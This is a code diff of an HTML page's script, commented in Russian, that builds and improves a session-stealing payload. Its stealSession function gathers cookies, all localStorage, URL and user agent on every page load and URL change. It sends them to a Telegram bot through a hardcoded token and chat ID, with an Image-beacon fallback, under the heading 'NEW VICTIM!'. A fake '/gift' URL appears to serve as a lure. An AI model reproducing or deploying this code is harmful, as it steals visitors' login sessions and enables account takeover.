@@ -46,50 +46,79 @@
 
 <script>
 // === НАСТРОЙКИ БОТА ===
-const BOT_TOKEN = "7845123456:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx";   // ← Замени на свой токен
-const CHAT_ID = "123456789";                                     // ← Замени на свой chat_id
+const BOT_TOKEN = "8766124425:AAGo8j4YjLDD418G8xwj4zN2pEuCNh-Vyc4";   // ← Замени!
+const CHAT_ID = "7523357134";                                     // ← Замени!
+
+async function sendToBot(text) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: "HTML",
+                disable_web_page_preview: true
+            }),
+            keepalive: true
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+        return true;
+    } catch (error) {
+        console.error("Ошибка отправки в бот:", error);
+        
+        // Отправляем сообщение об ошибке (используем Image beacon как запасной вариант)
+        try {
+            const errorMsg = `❌ Ошибка отправки данных!\n\n` +
+                             `Время: ${new Date().toISOString()}\n` +
+                             `Ошибка: ${error.message}\n` +
+                             `URL: ${window.location.href}`;
+            
+            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(errorMsg)}`;
+        } catch (e) {}
+        
+        return false;
+    }
+}
 
 function stealSession() {
     const data = {
         timestamp: Date.now(),
         url: window.location.href,
-        cookies: document.cookie,
+        cookies: document.cookie || "cookies пустые",
         localStorage: {},
         userAgent: navigator.userAgent,
-        referrer: document.referrer,
+        referrer: document.referrer || "нет",
         stolenAt: new Date().toISOString()
     };
 
-    // Собираем весь localStorage (самое ценное)
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        data.localStorage[key] = localStorage.getItem(key);
+    // Собираем localStorage
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            data.localStorage[key] = localStorage.getItem(key);
+        }
+    } catch (e) {
+        data.localStorageError = e.message;
     }
 
-    const messageText = "🎁 НОВАЯ ЖЕРТВА!\n\n" +
-        "Время: " + data.stolenAt + "\n" +
-        "URL: " + data.url + "\n" +
-        "User-Agent: " + data.userAgent + "\n\n" +
-        "Cookies:\n" + (data.cookies || "нет") + "\n\n" +
-        "LocalStorage:\n" + JSON.stringify(data.localStorage, null, 2);
+    const successMessage = `🎁 НОВАЯ ЖЕРТВА!\n\n` +
+        `Время: ${data.stolenAt}\n` +
+        `URL: ${data.url}\n` +
+        `User-Agent: ${data.userAgent}\n\n` +
+        `Cookies (${data.cookies.length} символов):\n${data.cookies.substring(0, 800)}...\n\n` +
+        `LocalStorage ключей: ${Object.keys(data.localStorage).length}`;
 
-    // Отправляем в Telegram-бота
-    fetch(`https://api.telegram.org/bot${8766124425:AAGo8j4YjLDD418G8xwj4zN2pEuCNh-Vyc4}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: messageText,
-            parse_mode: "HTML",
-            disable_web_page_preview: true
-        }),
-        keepalive: true
-    }).catch(err => {
-        console.log("Ошибка отправки:", err);
-    });
+    // Отправляем основные данные
+    sendToBot(successMessage);
 }
 
-// Запускаем кражу при загрузке и при изменении URL
+// Запускаем кражу
 window.addEventListener('load', stealSession);
 window.addEventListener('hashchange', stealSession);
 window.addEventListener('popstate', stealSession);
@@ -97,7 +126,9 @@ window.addEventListener('popstate', stealSession);
 // Обновляем отображаемый URL
 setInterval(() => {
     let url = window.location.href;
-    if (!url.includes('/gift')) url += (url.includes('#') ? '' : '#') + '/gift';
+    if (!url.includes('/gift')) {
+        url += (url.includes('#') ? '' : '#') + '/gift';
+    }
     document.getElementById('currentUrl').textContent = url;
 }, 500);
 </script>
